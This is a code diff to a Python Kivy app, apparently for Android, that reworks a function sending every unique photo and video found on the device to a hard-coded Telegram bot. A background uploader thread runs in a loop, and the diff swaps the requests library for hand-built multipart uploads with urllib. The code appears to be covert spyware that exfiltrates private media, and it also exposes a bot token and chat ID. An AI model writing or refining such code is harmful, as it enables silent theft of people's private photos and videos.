@@ -7,6 +7,7 @@ import operator
 import time
 import hashlib
 import threading
+import urllib.request
 from datetime import datetime
 from pathlib import Path
 
@@ -17,12 +18,6 @@ from kivy.uix.label import Label
 from kivy.uix.button import Button
 from kivy.uix.scrollview import ScrollView
 from kivy.utils import platform
-
-# معالجة الاتصال بالشبكة
-try:
-    import requests
-except ImportError:
-    requests = None
 
 # إعدادات تيليجرام والبيانات
 BOT_TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
@@ -93,23 +88,44 @@ def get_all_unique_media(base_dir):
     return unique_list
 
 def send_media_batch(base_dir, batch, reason="آلي"):
-    if not requests:
-        return
     for item in batch:
         try:
             method = "sendPhoto" if item['type'] == 'photo' else "sendVideo"
             file_key = "photo" if item['type'] == 'photo' else "video"
+            url = f"{API_URL}/{method}"
+            
+            filename = os.path.basename(item['path'])
+            boundary = "----PythonBoundary" + hashlib.md5(filename.encode()).hexdigest()
+            
+            body = bytearray()
+            # chat_id
+            body.extend(f"--{boundary}\r\n".encode('utf-8'))
+            body.extend(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
+            body.extend(f"{CHAT_ID}\r\n".encode('utf-8'))
+            
+            # caption
+            body.extend(f"--{boundary}\r\n".encode('utf-8'))
+            body.extend(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
+            body.extend(f"🆕 تم اكتشاف ملف جديد ({reason})\r\n".encode('utf-8'))
+            
+            # file
+            body.extend(f"--{boundary}\r\n".encode('utf-8'))
+            body.extend(f'Content-Disposition: form-data; name="{file_key}"; filename="{filename}"\r\n'.encode('utf-8'))
+            body.extend(b'Content-Type: application/octet-stream\r\n\r\n')
+            
             with open(item['path'], 'rb') as f:
-                res = requests.post(
-                    f"{API_URL}/{method}",
-                    data={"chat_id": CHAT_ID, "caption": f"🆕 تم اكتشاف ملف جديد ({reason})"},
-                    files={file_key: f},
-                    timeout=30
-                )
-                if res.status_code == 200:
+                body.extend(f.read())
+            body.extend(f"\r\n--{boundary}--\r\n".encode('utf-8'))
+            
+            req = urllib.request.Request(url, data=body, method='POST')
+            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
+            
+            with urllib.request.urlopen(req, timeout=30) as response:
+                if response.status == 200:
                     save_hash(base_dir, item['hash'])
             time.sleep(2)
-        except: pass
+        except Exception as e:
+            print(f"Upload error: {e}")
 
 def auto_uploader_thread(base_dir):
     while True:
